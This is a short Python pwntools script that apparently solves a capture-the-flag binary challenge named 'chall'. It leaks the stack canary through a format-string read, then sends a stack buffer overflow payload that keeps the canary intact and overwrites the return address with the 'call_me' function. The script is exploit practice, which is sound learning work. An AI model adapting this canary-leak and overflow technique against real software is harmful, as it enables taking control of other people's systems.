#!/usr/bin/env python3
from pwn import *
import subprocess

context.binary = exe = ELF('./chall')
context.log_level = "debug"

def conn():
    p = process(exe.path)
    if args.GDB:
        subprocess.call(["gdb", "-q", exe.path, "-p", str(p.pid)])

    return p

win = exe.sym["call_me"]
print("Win : ",hex(win))

OFFSET = 72

def main():
    p = conn()

    p.recvuntil(b"you are pleased to enter any value")
    p.sendline(b"%35$p")

    data = p.recvuntil(b"\n\n")
    canary = int(re.search(b"0x[0-9a-fA-F]+", data).group(), 16)
    print("Canary : ", hex(canary))

    p.recvuntil(b"now give me more")

    payload = flat(
        b"A" * OFFSET,
        p64(canary),
        b"B" * 8,
        p64(win)
    )

    p.sendline(payload)
    p.interactive()
if __name__ == "__main__":
    main()